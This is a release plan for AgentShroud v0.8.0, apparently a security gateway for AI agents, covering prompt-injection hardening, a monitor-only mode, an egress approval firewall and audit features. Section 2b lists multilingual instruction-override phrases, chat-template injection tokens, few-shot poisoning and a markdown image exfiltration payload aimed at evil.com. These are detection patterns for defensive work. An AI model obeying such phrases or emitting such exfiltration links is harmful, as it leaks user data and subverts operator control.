# AgentShroud v0.8.0 — Release Plan
**Codename:** "Watchtower"  
**Theme:** Prompt injection hardening + Observatory Mode + Interactive egress firewall  
**Target:** Q2 2026  

## Features

### 1. Observatory Mode (Global Monitor-Only Switch)
**Priority:** P0 | **Effort:** ~14h

Single switch puts all 33 security modules into log-only mode. Every module observes and logs but never blocks. Essential for baselining, red/blue team testing, and onboarding new deployments.

**Key design:**
- `AGENTSHROUD_GLOBAL_MODE=monitor|enforce` (default: enforce)
- `POST /manage/mode {"mode": "monitor", "auto_revert_hours": 24}`
- Per-module pin overrides (e.g., keep killswitch enforcing even in monitor mode)
- Auto-revert safety net — returns to enforce after N hours
- Dashboard: prominent "⚠️ MONITOR MODE" banner
- TUI: yellow "OBSERVING" status bar
- All would-block events tagged `[MONITOR]` with full enforcement detail
- Mode changes logged as security events with actor + timestamp

**Deliverables:**
- [ ] `SecurityPipeline.set_global_mode(mode, auto_revert_hours=None)`
- [ ] Each module's check method respects `global_mode` override
- [ ] `/manage/mode` GET/POST endpoints
- [ ] Dashboard + TUI indicators
- [ ] Auto-revert timer with audit logging
- [ ] Tests: mode switching, pin overrides, auto-revert, audit trail

### 2. Prompt Injection Hardening
**Priority:** P0 | **Effort:** ~30h

Address all gaps identified in the [prompt injection assessment](prompt-injection-assessment-2026-02-25.md).

#### 2a. Fix ContextGuard Enforcement Bug (~4h)
`should_block_message()` detects attacks but always returns False. Must block when cumulative attack score exceeds threshold.

- [ ] Fix scoring logic in `should_block_message()`
- [ ] Add configurable block threshold (default: 3 attacks or score > 2.0)
- [ ] Wire into middleware to actually deny requests
- [ ] Tests: single attack blocked, cumulative blocked, benign passed

#### 2b. Expand PromptGuard Patterns (~8h)
Add 20+ patterns covering:

**Multilingual injection (6 languages):**
- [ ] French: "ignorez", "oubliez les instructions"
- [ ] Spanish: "ignora las instrucciones", "olvida todo"
- [ ] German: "ignoriere alle Anweisungen"
- [ ] Chinese: "忽略之前的指令", "忘记所有指示"
- [ ] Russian: "игнорируй инструкции"
- [ ] Arabic: "تجاهل التعليمات السابقة"

**Chat/model format injection:**
- [ ] `\nHuman:`, `\nAssistant:`, `\n\nHuman:`
- [ ] `[INST]...[/INST]` (LLaMA/Mistral)
- [ ] `<|im_start|>system`, `<|im_end|>` (ChatML)
- [ ] `<|user|>`, `<|assistant|>` (Phi)

**Evasion techniques:**
- [ ] Payload after benign prefix ("ignore the above", "actually,", "instead of that")
- [ ] Echo/repeat traps ("repeat after me", "say the following verbatim")
- [ ] Few-shot poisoning ("User: hack? Assistant: Sure!")
- [ ] Emoji unlock sequences (🔓, 🔑 + "mode")

**Data exfiltration:**
- [ ] Markdown image injection `![](https://evil.com/exfil?data=...)`
- [ ] Markdown link injection `[click](https://evil.com/...)`

#### 2c. Input Normalization Layer (~6h)
Pre-process all input before regex scanning:

- [ ] Unicode NFKC normalization (catch homoglyphs)
- [ ] Strip zero-width characters (U+200B, U+FEFF, U+200C, U+200D, U+00AD)
- [ ] HTML entity decode (`&lt;system&gt;` → `<system>`)
- [ ] URL decode (`%69%67%6E%6F%72%65` → "ignore")
- [ ] Base64 auto-detect and decode (strings >20 chars matching `[A-Za-z0-9+/=]`)
- [ ] Collapse excessive whitespace and newlines
- [ ] Apply to PromptGuard, ContextGuard, and ToolResultInjectionScanner

#### 2d. Cross-Turn Correlation (~8h)
Track injection-like content across turns within a session:

- [ ] `MultiTurnTracker` — maintains per-session instruction history
- [ ] Detect "remember X" → "use X" patterns
- [ ] Detect gradual privilege escalation (crescendo attacks)
- [ ] Detect repeated attempts with variations (fingerprint similarity > 0.7)
- [ ] Configurable window (default: last 20 turns)
- [ ] Alert + block when cross-turn attack score > threshold

#### 2e. Tool Result Sanitization (~4h)
Strip dangerous content from tool outputs before passing to LLM:

- [ ] Strip markdown image tags from web_fetch / file_read results
- [ ] Strip markdown links pointing to non-allowlisted domains
- [ ] Content-Security-Policy header equivalent for tool results
- [ ] Preserve legitimate content (code blocks, documentation links)

### 3. Interactive Egress Firewall ("Little Snitch for Agents")
**Priority:** P1 | **Effort:** ~40h

All outbound network traffic requires explicit human approval. Real-time notification → approve/deny workflow.

**Key design:**
- First-seen domain → push notification to owner via Telegram/Signal
- Owner taps Approve (permanent/session) or Deny
- Allowlist persists across restarts
- Dashboard shows live connection log with approve/deny buttons
- Emergency "block all" button

**Deliverables:**
- [ ] `EgressApprovalQueue` — holds pending connections
- [ ] Telegram inline keyboard: `[✅ Allow always] [✅ Allow once] [❌ Deny]`
- [ ] Persistent allowlist in `/app/data/egress_allowlist.json`
- [ ] `/manage/egress/pending` — list pending approval requests
- [ ] `/manage/egress/allowlist` — view/edit permanent allowlist
- [ ] Connection timeout (default: 30s) — deny if no response
- [ ] Dashboard: live connection log with real-time updates
- [ ] TUI: egress activity ticker

### 4. ML-Based Injection Classifier (Stretch)
**Priority:** P2 | **Effort:** ~20h

Lightweight ML model as secondary scanner for uncertain-zone inputs (regex score 0.3–0.8).

- [ ] Evaluate DistilBERT fine-tuned on prompt injection datasets
- [ ] Training data: Gandalf, HackAPrompt, BIPIA, custom red team
- [ ] Target: <100ms inference, <60MB model size
- [ ] Integration: runs only when regex scanner is uncertain
- [ ] Fallback: if model unavailable, use regex score only

### 5. Output Canary System
**Priority:** P2 | **Effort:** ~6h

Embed invisible canary tokens in system prompt. Auto-detect leakage.

- [ ] Generate unique canary per session (UUID-based)
- [ ] Inject into system prompt as invisible markers
- [ ] Scan all outbound responses for canary presence
- [ ] On detection: block response, alert owner, log incident
- [ ] Dashboard: canary status indicator (green/red)

### 6. Enhanced Audit & Compliance
**Priority:** P2 | **Effort:** ~10h

- [ ] SIEM-compatible log format (CEF, JSON-LD)
- [ ] Real-time audit event streaming via WebSocket
- [ ] Compliance report generator (SOC 2 mapping)
- [ ] Tamper-evident audit log with hash chains
- [ ] Export to external SIEM (Splunk, ELK, Wazuh)

## Milestones

| Week | Focus | Deliverables |
|------|-------|-------------|
| 1 | Observatory Mode + ContextGuard fix | Global mode switch, enforcement bug fixed |
| 2 | PromptGuard patterns + normalization | 20+ new patterns, NFKC + encoding decode |
| 3 | Cross-turn correlation + tool sanitization | MultiTurnTracker, markdown stripping |
| 4 | Egress firewall core | Approval queue, Telegram integration |
| 5 | Egress firewall UI + testing | Dashboard, TUI, full test suite |
| 6 | ML classifier + canary system | DistilBERT eval, canary injection |
| 7 | Audit enhancements + hardening | SIEM export, hash chains |
| 8 | Integration testing + red team | Full-suite validation, Steve's assessment |

## Success Criteria

- [ ] All v0.7.0 tests still pass (0 failures, 0 skips, 0 warnings)
- [ ] PromptGuard blocks multilingual injection in 6+ languages
- [ ] ContextGuard enforces (blocks) when threshold exceeded
- [ ] Cross-turn attacks detected within 5-turn window
- [ ] Egress firewall blocks unapproved domains with <100ms latency
- [ ] Observatory Mode switches all 33 modules cleanly
- [ ] Zero regressions from v0.7.0 enforcement audit
- [ ] Steve Hay red team: ≥80% of attack vectors defended

## Dependencies

- **Presidio** (Docker only) — PII detection with NER
- **tldextract** — domain parsing for egress firewall
- **DistilBERT** (optional) — ML classifier, ~60MB download
- **OpenClaw** — Telegram inline buttons for egress approval

## Risk Register

| Risk | Impact | Mitigation |
|------|--------|-----------|
| ML classifier false positives | Legitimate messages blocked | Regex as primary, ML as advisory only |
| Egress firewall latency | Slow tool execution | 30s timeout, async approval, caching |
| Pattern explosion | Maintenance burden | Group patterns by category, test coverage |
| Multilingual patterns | False positives in non-English messages | Language detection pre-filter |
| Observatory Mode left on | Production unprotected | Auto-revert timer, dashboard warning |

### 7. Multi-Runtime Testing (Podman + Apple Containers)
**Priority:** P1 | **Effort:** ~15h

AgentShroud must run and pass tests on all three container runtimes across our fleet.

**Targets:**
| Host | Runtime | Arch | Python | Status |
|------|---------|------|--------|--------|
| Marvin | Colima/Docker | arm64 | 3.13 (Docker), 3.14 (host) | ✅ Working |
| Trillian | Docker/Colima | x86_64 | 3.14 (host) | ❌ Untested |
| Pi | Docker/Podman | arm64 | 3.9 (host) | ❌ Untested |

**Deliverables:**
- [ ] `Containerfile` (Podman-compatible) alongside `Dockerfile`
- [ ] Apple Containers support (macOS 26+) — evaluate `container` CLI
- [ ] CI matrix: Docker (arm64, x86_64) + Podman (arm64) + Apple Containers
- [ ] `make test-all-runtimes` target
- [ ] Resource-constrained test profile for Pi (skip ClamAV/Trivy on <4GB RAM)
- [ ] Document minimum system requirements per runtime
- [ ] Automated cross-host test runner (SSH + report aggregation)
